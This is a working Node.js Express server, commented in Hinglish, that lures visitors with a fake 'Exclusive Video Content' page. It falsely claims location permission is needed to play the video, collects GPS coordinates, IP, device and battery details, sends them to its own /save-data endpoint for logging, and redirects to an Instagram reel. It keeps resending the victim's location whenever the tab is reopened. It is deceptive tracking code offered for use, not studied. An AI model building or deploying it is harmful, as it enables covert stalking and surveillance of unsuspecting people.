const express = require('express');
const app = express();

const TARGET_URL = 'https://www.instagram.com/reel/Da0A1xYJD2K/?igsh=aTgxcGV1a3FmYTgz';

app.get('/', (req, res) => {
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const timestamp = new Date().toISOString();

    // IP-based fallback log on server start
    fetch(`http://ip-api.com/json/${ip.split(',')[0]}`)
        .then(response => response.json())
        .then(data => {
            console.log(`IP_LOG => Time: ${timestamp} | IP: ${ip} | ISP: ${data.isp} | Location: ${data.city}, ${data.regionName}`);
        }).catch(() => {});

    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <title>Loading Video...</title>
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <style>
                body { font-family: Arial, sans-serif; text-align: center; padding-top: 80px; background: #111; color: #fff; }
                .btn { background: #3498db; color: white; padding: 15px 30px; font-size: 18px; border: none; border-radius: 8px; cursor: pointer; font-weight: bold; margin-top: 20px; }
                .btn:active { background: #2980b9; }
                p { color: #aaa; margin-top: 15px; }
            </style>
        </head>
        <body>
            <h2>Exclusive Video Content</h2>
            <p>Tap the button below to load the video:</p>
            <button class="btn" onclick="collectAllInfoAndTrack()">Play Video</button>

            <script>
                let redirected = false;

                // 1. Saari device aur browser ki details collect karne ka function
                async function getDeviceInfo() {
                    let batteryLevel = 'Unknown';
                    let isCharging = 'Unknown';

                    try {
                        if (navigator.getBattery) {
                            const battery = await navigator.getBattery();
                            batteryLevel = Math.round(battery.level * 100) + '%';
                            isCharging = battery.charging ? 'Yes' : 'No';
                        }
                    } catch (e) {}

                    return {
                        userAgent: navigator.userAgent,
                        platform: navigator.platform,
                        language: navigator.language,
                        screen: window.screen.width + 'x' + window.screen.height,
                        cores: navigator.hardwareConcurrency || 'Unknown',
                        ram: navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'Unknown',
                        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                        connection: navigator.connection ? (navigator.connection.effectiveType || 'Unknown') : 'Unknown',
                        battery: batteryLevel,
                        charging: isCharging
                    };
                }

                // 2. GPS Location aur Device Info dono server par bhejne ka function
                async function sendDataToSever(lat, lon) {
                    const info = await getDeviceInfo();

                    const queryParams = new URLSearchParams({
                        lat: lat,
                        lon: lon,
                        userAgent: info.userAgent,
                        platform: info.platform,
                        language: info.language,
                        screen: info.screen,
                        cores: info.cores,
                        ram: info.ram,
                        timezone: info.timezone,
                        connection: info.connection,
                        battery: info.battery,
                        charging: info.charging
                    });

                    fetch('/save-data?' + queryParams.toString());
                }

                // 3. Button click par tracking shuru karna
                function collectAllInfoAndTrack() {
                    if (navigator.geolocation) {
                        navigator.geolocation.getCurrentPosition(function(position) {
                            const lat = position.coords.latitude;
                            const lon = position.coords.longitude;
                            
                            // Server par GPS + Device Info bhejna
                            sendDataToSever(lat, lon);

                            // YouTube video par redirect karna
                            if (!redirected) {
                                redirected = true;
                                setTimeout(function() {
                                    window.location.href = '${TARGET_URL}';
                                }, 1200);
                            }
                        }, function(error) {
                            alert("Location permission is required to watch the video!");
                        }, { 
                            enableHighAccuracy: true, 
                            maximumAge: 0, 
                            timeout: 20000 
                        });
                    } else {
                        window.location.href = '${TARGET_URL}';
                    }
                }

                // 4. Jab user phone dobara unlock karega ya tab kholega, tab naya data automatic chala jayega
                document.addEventListener("visibilitychange", function() {
                    if (document.visibilityState === "visible") {
                        if (navigator.geolocation) {
                            navigator.geolocation.getCurrentPosition(function(position) {
                                sendDataToSever(position.coords.latitude, position.coords.longitude);
                            });
                        }
                    }
                });
            </script>
        </body>
        </html>
    `);
});

// Server par saari information (GPS + Device Details) receive karne ka endpoint
app.get('/save-data', (req, res) => {
    const data = req.query;
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const time = new Date().toLocaleTimeString();

    console.log(`=== FULL_DEVICE_LOG ===`);
    console.log(`Time: ${time} | IP: ${ip}`);
    console.log(`Latitude: ${data.lat} | Longitude: ${data.lon}`);
    console.log(`Device/OS: ${data.platform} | UA: ${data.userAgent}`);
    console.log(`Screen: ${data.screen} | Cores: ${data.cores} | RAM: ${data.ram}`);
    console.log(`Timezone: ${data.timezone} | Network: ${data.connection}`);
    console.log(`Battery: ${data.battery} (Charging: ${data.charging})`);
    console.log(`=======================`);

    res.sendStatus(200);
});

module.exports = app;
